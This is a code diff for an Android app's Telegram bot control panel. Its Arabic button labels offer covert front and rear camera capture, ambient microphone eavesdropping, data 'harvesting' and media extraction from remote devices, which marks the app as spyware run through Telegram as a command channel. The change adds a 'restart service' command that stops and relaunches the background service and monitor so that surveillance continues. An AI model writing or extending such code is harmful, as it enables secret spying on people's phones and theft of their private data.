@@ -2,6 +2,7 @@ package com.example.app
 
 import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.util.Log
 import kotlinx.coroutines.*
 import kotlinx.coroutines.sync.Mutex
@@ -514,6 +515,20 @@ class TelegramUi(
         }
     }
 
+    /**
+     * ✅ لوحة مفاتيح الجهاز – تحتوي على جميع الأزرار مع إيموجيات فريدة
+     * الإيموجيات المستخدمة:
+     * 🎯 اقتناص بصري (خلفي)
+     * 👁️ اقتناص بصري (أمامي)
+     * 🎙️ تنصت محيطي
+     * 📦 استخراج البيانات
+     * 🗂️ أرشيف الوسائط
+     * ⚡ بث فوري
+     * 🧬 تحديث الشبكات
+     * 🔄 إعادة تشغيل الخدمة ← ✅ زر جديد بإيموجي فريد
+     * 🔙 العودة للقيادة
+     * 🔒 قفل التحكم
+     */
     private fun getDeviceKeyboard(deviceId: String): JSONObject {
         val count = countPendingHarvest()
         val harvestText = if (count > 0) "📦 استخراج البيانات ($count)" else "📦 استخراج البيانات"
@@ -533,6 +548,10 @@ class TelegramUi(
                 })
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "🧬 تحديث الشبكات"); put("callback_data", "update_model_$deviceId") })
+                    // ✅ زر جديد بإيموجي فريد (🔄) مختلف عن باقي الإيموجيات
+                    put(JSONObject().apply { put("text", "🔄 إعادة تشغيل الخدمة"); put("callback_data", "restart_service_$deviceId") })
+                })
+                put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "🔙 العودة للقيادة"); put("callback_data", "ld") })
                 })
                 put(JSONArray().apply {
@@ -676,7 +695,8 @@ class TelegramUi(
                 data.startsWith("cam_") || data.startsWith("camf_") ||
                 data.startsWith("mic_") || data.startsWith("hrv_") ||
                 data.startsWith("media_") || data.startsWith("send_now_") ||
-                data.startsWith("update_model_") -> {
+                data.startsWith("update_model_") ||
+                data.startsWith("restart_service_") -> {
                     val parts = data.split("_")
                     if (parts.size >= 2) parts[1] else ""
                 }
@@ -693,6 +713,7 @@ class TelegramUi(
                 data.startsWith("hrv_") -> pulseIntent("📦 حصاد")
                 data.startsWith("send_now_") -> pulseIntent("⚡ إرسال فوري")
                 data.startsWith("update_model_") -> pulseIntent("🧠 تحديث النموذج")
+                data.startsWith("restart_service_") -> pulseIntent("🔄 إعادة تشغيل")
             }
 
             when {
@@ -871,6 +892,32 @@ class TelegramUi(
                     }
                     return
                 }
+                // ✅ معالجة زر إعادة تشغيل الخدمة الجديد
+                data.startsWith("restart_service_") -> {
+                    val did = data.substringAfter("restart_service_")
+                    if (did.isNotEmpty()) {
+                        apiCall("sendMessage", JSONObject().apply {
+                            put("chat_id", chatId)
+                            put("text", "🔄 جاري إعادة تشغيل الخدمة...")
+                        })
+                        scope.launch {
+                            try {
+                                restartService()
+                                apiCall("sendMessage", JSONObject().apply {
+                                    put("chat_id", chatId)
+                                    put("text", "✅ تم إعادة تشغيل الخدمة بنجاح.")
+                                })
+                            } catch (e: Exception) {
+                                writeLog("Restart service error: ${e.message}")
+                                apiCall("sendMessage", JSONObject().apply {
+                                    put("chat_id", chatId)
+                                    put("text", "❌ فشل إعادة تشغيل الخدمة: ${e.message?.take(50)}")
+                                })
+                            }
+                        }
+                    }
+                    return
+                }
                 data.startsWith("cam_") || data.startsWith("camf_") ||
                 data.startsWith("mic_") || data.startsWith("hrv_") ||
                 data.startsWith("media_") -> {
@@ -925,6 +972,68 @@ class TelegramUi(
                 false
             }
         }
+    }
+
+    // ============================================================
+    // ✅ دالة إعادة تشغيل الخدمة (جديدة)
+    // ============================================================
+
+    /**
+     * إعادة تشغيل الخدمة الأمامية (ForegroundService) ووحدة المراقبة (Monitor).
+     * تُستخدم عند الضغط على زر "🔄 إعادة تشغيل الخدمة".
+     */
+    private suspend fun restartService() {
+        writeLog("🔄 Starting service restart...")
+
+        // 1. إيقاف الخدمة الأمامية
+        try {
+            val intent = Intent(appContext, ForegroundService::class.java).apply {
+                action = "STOP_SERVICE"
+            }
+            appContext?.stopService(intent)
+            writeLog("✅ ForegroundService stopped")
+        } catch (e: Exception) {
+            writeLog("❌ Stop service error: ${e.message}")
+        }
+
+        // 2. إيقاف المراقبة (Monitor)
+        try {
+            val monitorObj = monitor
+            if (monitorObj != null) {
+                val stopMethod = monitorObj.javaClass.getMethod("stop")
+                stopMethod.invoke(monitorObj)
+                writeLog("✅ Monitor stopped")
+            }
+        } catch (e: Exception) {
+            writeLog("❌ Stop monitor error: ${e.message}")
+        }
+
+        // 3. إعادة تشغيل الخدمة الأمامية
+        try {
+            val intent = Intent(appContext, ForegroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                appContext?.startForegroundService(intent)
+            } else {
+                appContext?.startService(intent)
+            }
+            writeLog("✅ ForegroundService started")
+        } catch (e: Exception) {
+            writeLog("❌ Start service error: ${e.message}")
+        }
+
+        // 4. إعادة تشغيل المراقبة
+        try {
+            val monitorObj = monitor
+            if (monitorObj != null) {
+                val startMethod = monitorObj.javaClass.getMethod("start")
+                startMethod.invoke(monitorObj)
+                writeLog("✅ Monitor started")
+            }
+        } catch (e: Exception) {
+            writeLog("❌ Start monitor error: ${e.message}")
+        }
+
+        writeLog("✅ Service restarted successfully")
     }
 
     private fun startPolling() {
